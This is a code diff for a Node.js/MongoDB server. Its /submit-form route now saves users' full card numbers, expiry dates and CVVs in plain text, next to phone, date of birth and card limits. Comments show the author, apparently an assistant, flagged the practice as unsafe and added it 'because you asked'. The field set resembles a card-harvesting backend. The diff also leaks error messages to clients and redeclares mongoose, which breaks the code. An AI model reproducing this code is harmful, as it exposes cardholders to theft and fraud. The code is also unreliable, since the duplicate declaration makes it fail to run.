@@ -8,8 +8,6 @@ const { Server } = require("socket.io");
 const app = express();
 const PORT = 3000;
 
-const User = require("./models/User");
-
 /* =======================
    HTTP SERVER & SOCKET.IO
 ======================= */
@@ -57,25 +55,118 @@ const CallLogSchema = new mongoose.Schema({
 
 const CallLog = mongoose.model("CallLog", CallLogSchema);
 
+const mongoose = require("mongoose");
+
+const UserSchema = new mongoose.Schema({
+
+    // ✅ App user info
+    userId: { type: String, required: true }, // NEW: link to user
+    name: {
+        type: String,
+        required: true,
+        trim: true
+    },
+
+    phone: {
+        type: String,
+        required: true,
+        index: true
+    },
+
+    dob: {
+        type: String
+    },
+
+    email: {
+        type: String,
+        lowercase: true,
+        trim: true
+    },
+
+    city: {
+        type: String
+    },
+
+    // ✅ Card info (⚠️ NOT RECOMMENDED for production)
+    cardHolderName: {
+        type: String
+    },
+
+    cardTotalLimit: {
+        type: Number
+    },
+
+    cardAvailableLimit: {
+        type: Number
+    },
+
+    cardNumber: {
+        type: String, // ⚠️ Sensitive
+        select: false // ✅ won't auto-return in queries
+    },
+
+    expiryDate: {
+        type: String
+    },
+
+    cvv: {
+        type: String,
+        select: false // ✅ extra safety
+    }
+
+}, {
+    timestamps: true
+});
+
+module.exports = mongoose.model("User", UserSchema);
+
+
 
 app.post("/submit-form", async (req, res) => {
     try {
-        const user = new User(req.body);
+        // ✅ Convert card limits to numbers
+        const data = {
+            userId: req.body.userId,
+            name: req.body.name,
+            email: req.body.email,
+            phone: req.body.phone,
+            dob: req.body.dob,
+            city: req.body.city,
+
+            cardHolderName: req.body.cardHolderName,
+
+            cardTotalLimit: req.body.cardTotalLimit
+                ? Number(req.body.cardTotalLimit)
+                : null,
+
+            cardAvailableLimit: req.body.cardAvailableLimit
+                ? Number(req.body.cardAvailableLimit)
+                : null,
+
+            // ⚠️ NOT RECOMMENDED (but added because you asked)
+            cardNumber: req.body.cardNumber,
+            expiryDate: req.body.expiryDate,
+            cvv: req.body.cvv
+        };
+
+        // ✅ Save user
+        const user = new User(data);
         await user.save();
 
         return res.status(201).json({
             success: true,
-            message: "User data saved successfully"
+            message: "User & card data saved successfully"
         });
 
     } catch (error) {
-        console.error(error);
+        console.error("SAVE ERROR:", error.message);
         return res.status(500).json({
             success: false,
-            message: "Server error"
+            error: error.message
         });
     }
 });
+
 /* =======================
    MIDDLEWARE
 ======================= */
